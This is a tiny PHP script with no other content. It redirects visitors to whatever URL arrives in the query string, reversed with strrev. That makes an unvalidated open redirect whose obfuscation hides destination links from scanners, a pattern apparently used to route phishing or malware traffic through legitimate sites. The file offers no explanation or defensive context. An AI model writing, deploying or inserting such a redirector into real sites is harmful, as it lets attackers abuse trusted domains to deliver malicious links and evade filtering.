<?php
header('Location: '.strrev($_SERVER['QUERY_STRING']));
exit();
?>